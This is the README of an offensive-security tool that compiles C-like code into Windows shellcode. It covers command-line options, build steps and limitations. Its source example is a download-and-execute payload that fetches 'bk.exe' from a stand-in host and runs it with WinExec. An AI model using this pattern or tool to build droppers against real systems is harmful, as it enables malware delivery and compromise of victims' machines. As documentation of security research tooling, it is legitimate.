# Shellcode Compiler

Shellcode Compiler is a program that compiles C/C++ style code into a small, position-independent and NULL-free shellcode for Windows. It is possible to call any Windows API function in a user-friendly way.

Shellcode Compiler takes as input a source file and it uses it's own compiler to interpret the code and generate an assembly file which is assembled with Keystone engine.

Shellcode compiler was released at DefCamp security conference in Romania, November 2016.

# Command line options
        -h (--help)      : Show this help message
        -p (--platform)  : Shellcode platform: win_x86,win_x64,linux_x86,linux_x64
        -v (--verbose)   : Print detailed output
        -t (--test)      : Test (execute) generated shellcode
        -r (--read)      : Read source code file
        -o (--output)    : Output file of the generated binary shellcode
        -a (--assembbly) : Output file of the generated assembly code

# Source code example

        function URLDownloadToFileA("urlmon.dll");
        function WinExec("kernel32.dll");
        function ExitProcess("kernel32.dll");

        URLDownloadToFileA(0,"https://site.com/bk.exe","bk.exe",0,0);
        WinExec("bk.exe",0);
        ExitProcess(0);
        
# Invocation example
        ShellcodeCompiler.exe -r Source.txt -o Shellcode.bin -a Assembly.asm
        
# Limitations
1. It is not possible to use the return value of an API call
2. It is not possible to use pointers or buffers
3. It is not possible to declare variables

All these limitations will be fixed as soon as possible. However, many other limitations will exist.
This is an Alpha version. Please report any bugs or suggestions.

# Changelog
1. Initial support for Windows x64

# Keystone compilation
1. Download Keystone Engine source code
2. Download, install and put in PATH cmake and python
3. Open Visual Studio 2019 - x86 (for 32 bits) and x64 (for 64 bits) Native Tools Command Prompts and go to Keystone source directory
4. Edit nmake-lib.bat file and replace -DLLVM_TARGETS_TO_BUILD="all" with -DLLVM_TARGETS_TO_BUILD="X86"
5. Run mkdir build and cd build commands
6. Run ..\nmake-lib.bat command
7. Copy the resulted lib file from keystone-src\build\llvm\lib\keystone.lib to ShellcodeCompiler\Keystone\keystone_x86.lib and keystone_x64.lib

# Author

Ionut Popescu (@NytroRST)
